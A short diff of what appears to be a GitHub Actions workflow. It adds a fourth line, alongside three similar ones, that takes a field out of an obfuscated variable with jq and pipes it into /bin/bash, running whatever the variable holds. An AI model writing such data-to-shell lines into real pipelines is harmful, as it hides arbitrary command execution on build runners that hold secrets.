@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$vcvwi4" | jq -r .p52 | /bin/bash
           printf '%s' "$yyy30" | jq -r .pgyrr6794 | /bin/bash
           printf '%s' "$b68" | jq -r .tdbc9 | /bin/bash
+          echo $q79 | jq -r .mtew3 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
